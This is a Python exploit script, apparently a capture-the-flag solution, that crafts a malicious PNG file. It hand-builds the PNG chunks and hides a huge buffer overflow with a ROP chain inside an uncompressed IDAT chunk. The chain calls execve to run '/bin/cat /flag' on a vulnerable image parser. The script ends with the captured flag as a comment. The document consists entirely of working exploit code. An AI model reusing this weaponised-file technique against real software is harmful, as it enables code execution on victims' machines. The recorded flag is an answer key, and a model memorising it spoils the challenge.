from pwn import *
from struct import unpack, unpack_from, pack
import zlib

CHUNK_TYPE_IHDR = b"IHDR"
CHUNK_TYPE_IDAT = b"IDAT"
CHUNK_TYPE_IEND = b"IEND"
CHUNK_TYPE_PLTE = b"PLTE"
CHUNK_TYPE_tRNS = b"tRNS"

# PNG image type

IMG_GREYSCALE           = 0x0
IMG_TRUECOLOUR          = 0x2
IMG_INDEXED_COLOUR      = 0x3
IMG_GREYSCALE_ALPHA     = 0x4
IMG_TRUECOLOUR_ALPHA    = 0x6

# Compression type

COMPRESSION_DEFLATE = 0

# Filter type

FILTER_NONE     = 0x0
FILTER_SUB      = 0x1
FILTER_UP       = 0x2
FILTER_AVERAGE  = 0x3
FILTER_PAETH    = 0x4

# Intralace method

INTRALACE_NONE  = 0x0
INTRALACE_ADAM7 = 0x1

class PNG:
    PNG_MAGIC = b"\x89PNG\r\n\x1a\n"

    def __init__(self) -> None:
        self.raw = b""
        self._init_header()

    def _init_header(self):
        self.raw += self.PNG_MAGIC
    
    def add_chunk(self, data_lenght: int, chunk_type: bytes, chunk_data: bytes):
        self.raw += p32(data_lenght, endian="big")
        self.raw += chunk_type
        self.raw += chunk_data
        self.raw += p32(zlib.crc32(chunk_data, zlib.crc32(chunk_type)), endian="big")

    def init_hdr(
        self,
        width: int,
        height: int,
        bit_depth: int,
        color_type: int,
        compress_mode: int,
        filter_method: int,
        interlace_method: int
    ):
        chunk_data = p32(width, endian="big")
        chunk_data += p32(height, endian="big")
        chunk_data += bytes([bit_depth])
        chunk_data += bytes([color_type])
        chunk_data += bytes([compress_mode])
        chunk_data += bytes([filter_method])
        chunk_data += bytes([interlace_method])
        self.add_chunk(13, CHUNK_TYPE_IHDR, chunk_data)

    def add_idat(self, chunk_data: bytes):
        self.add_chunk(len(chunk_data), CHUNK_TYPE_IDAT, chunk_data)

    def set_end(self):
        self.add_chunk(0, CHUNK_TYPE_IEND, b'')

    def write_file(self, filename: str = "test.png"):
        with open(filename, "wb") as file:
            file.write(self.raw)
            file.close()

png = PNG()
png.init_hdr(width=0x100, height=0x100, bit_depth=1, color_type=0, compress_mode=COMPRESSION_DEFLATE, filter_method=FILTER_NONE, interlace_method=INTRALACE_NONE)

pop_rax = lambda x : p64(0x000000000043adb6) + p64(x)   # pop rax ; ret
pop_rdi = lambda x : p64(0x0000000000404498) + p64(x)   # pop rdi ; ret
pop_rsi = lambda x : p64(0x000000000040cb67) + p64(x)   # pop rsi ; ret
pop_rdx = lambda x : p64(0x000000000040408b) + p64(x)   # pop rdx ; ret
write_to = lambda addr, value : pop_rdi(addr) + pop_rsi(value) + p64(0x0000000000425db0) # mov qword ptr [rdi], rsi ; ret
ret = p64(0x0000000000401016)                           # ret
syscall = p64(0x00000000004037e2)                       # syscall

def write_data(addr: int, data: bytes):
    p = b""
    for idx in range(0, len(data), 8):
        p += write_to(addr + idx, u64(data[idx:idx+8].ljust(8, b'\0')))
    return p

def write_argv(addr: int, argv: list):
    p = b""
    array_data_start = addr + (len(argv) * 8) + 8 # don't forget last NULL
    cur = 0
    for (idx, arg) in enumerate(argv):
        p += write_to(addr + (idx * 8), array_data_start + cur)
        p += write_data(array_data_start + cur, arg)
        cur += len(arg) + 0x8
    return p

rw_area = 0x5D9000
filename = 0x5DA000

cmd = [b"/bin/cat\0", b"/flag"]

rp = b""
rp += b"A"*0x190000
rp += ret * 0x100
rp += write_argv(rw_area, cmd)
rp += write_data(filename, cmd[0])
rp += pop_rax(0x3B)
rp += pop_rdi(filename)
rp += pop_rsi(rw_area)
rp += pop_rdx(0)
rp += syscall

png.add_idat(zlib.compress(rp.ljust(0x1000, b'C'), level=0))

png.set_end()
png.write_file("exploit.png")

# ECW{6af5821932932dd27c08130ff7d66109}